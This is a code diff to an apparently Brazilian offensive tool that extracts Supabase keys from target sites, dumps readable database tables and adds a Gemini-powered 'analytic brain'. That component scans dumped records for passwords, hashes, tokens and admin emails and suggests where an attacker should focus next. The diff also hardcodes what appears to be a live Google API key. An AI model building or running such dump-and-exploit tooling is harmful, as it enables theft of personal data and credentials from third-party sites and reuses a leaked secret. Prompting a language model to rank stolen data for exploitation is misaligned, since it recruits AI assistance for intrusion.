@@ -5,6 +5,7 @@ import json
 import re
 import time
 import base64
+import google.generativeai as genai
 from rich.console import Console
 from rich.panel import Panel
 from rich.table import Table
@@ -96,6 +97,36 @@ class KnowledgeManager:
             self.save()
 
 knowledge = KnowledgeManager()
+
+
+class ShyyunzBrain:
+    """Cérebro Analítico: Usa Gemini para minerar dados sensíveis em Dumps."""
+    def __init__(self, api_key: str):
+        genai.configure(api_key=api_key)
+        self.model = genai.GenerativeModel('gemini-1.5-flash')
+
+    async def analyze_data(self, table_name: str, data: List[Dict]):
+        if not data: return "Nenhum dado para analisar."
+        
+        # Amostragem para não estourar tokens (pega os 10 primeiros registros e converte p/ JSON compacto)
+        sample = json.dumps(data[:10], indent=2)
+        prompt = f"""
+        Você é o Cérebro Analítico da SHYYUNZ SEC. Analise o seguinte DUMP da tabela '{table_name}'.
+        Identifique:
+        1. Dados Sensíveis (Senhas, Hashes, Tokens, E-mails de Admins, IDs de transação).
+        2. Nível de Impacto (Baixo, Médio, Crítico).
+        3. Recomendações de Exploração (onde um atacante focaria agora?).
+        
+        Responda em PORTUGUÊS BRASIL de forma técnica e direta.
+        
+        DADOS:
+        {sample}
+        """
+        try:
+            response = self.model.generate_content(prompt)
+            return response.text
+        except Exception as e:
+            return f"[red][!] Erro no Cérebro Analítico: {e}[/red]"
 
 
 class ShyyunzAuditor:
@@ -540,6 +571,11 @@ async def audit_routine():
         
         bearer = console.input("[bold cyan][🔑 SHY_SEC][/bold cyan] API Bearer (Opcional): ").strip()
         target, apikey = await fetch_supabase_details(site_url)
+        
+        # Inicializa o Cérebro Analítico se houver chave
+        ai_key = "AIzaSyDTyiNk3xvtuNVETIve2UoI1D6VWj605K0" # Chave do Usuário
+        brain = ShyyunzBrain(ai_key)
+        
         if not target or not apikey:
             console.print("[yellow][!] Não foi possível extrair Supabase URL/Key automaticamente.[/yellow]")
             if not target: 
@@ -612,7 +648,33 @@ async def audit_routine():
             c = input("\n[S_SEC] Comando: ").strip().upper()
             if c == "0": return False
             elif c == "5": return True
-            elif c == "D": await auditor.mass_exfiltration()
+            elif c == "D": 
+                idx = console.input("Nr. do Alvo para DUMP/Análise: ").strip()
+                if idx in table_map:
+                    target_info = table_map[idx]
+                    t_name = target_info['name']
+                    if target_info['type'] == "TABLE" and target_info.get('readable'):
+                        async with httpx.AsyncClient() as client:
+                            res = await client.get(f"{auditor.base_url}{t_name}?select=*", headers=auditor.headers)
+                            if res.status_code == 200:
+                                resp_json = res.json()
+                                console.print(Panel(json.dumps(resp_json[:20], indent=2), title=f"Dump: {t_name} (Top 20)", border_style="green"))
+                                
+                                # Inteligência Artificial - ShyyunzBrain
+                                if brain:
+                                    opt = console.input("\n[bold magenta][🧠 SHY_BRAIN][/bold magenta] Deseja realizar Análise Profunda com IA? (S/N): ").strip().upper()
+                                    if opt == "S":
+                                        with console.status("[bold cyan][*] Cérebro Analítico processando dump...[/bold cyan]"):
+                                            analysis = await brain.analyze_data(t_name, resp_json)
+                                            console.print(Panel(analysis, title=f"Análise de IA: {t_name}", border_style="magenta"))
+                                else:
+                                    console.print("[dim][*] Análise de IA desativada (GEMINI_API_KEY não configurada).[/dim]")
+                            else:
+                                console.print(f"[bold red][!] Erro ao obter dados da tabela {t_name}: {res.status_code} - {res.text}[/bold red]")
+                    else:
+                        console.print("[yellow][!] Selecione uma tabela legível para DUMP/Análise.[/yellow]")
+                else:
+                    console.print("[yellow][!] Alvo inválido.[/yellow]")
             elif c == "K":
                 console.print(Panel(json.dumps(knowledge.data, indent=2), title="Cérebro da Shyyunz", border_style="green"))
             elif c == "L":
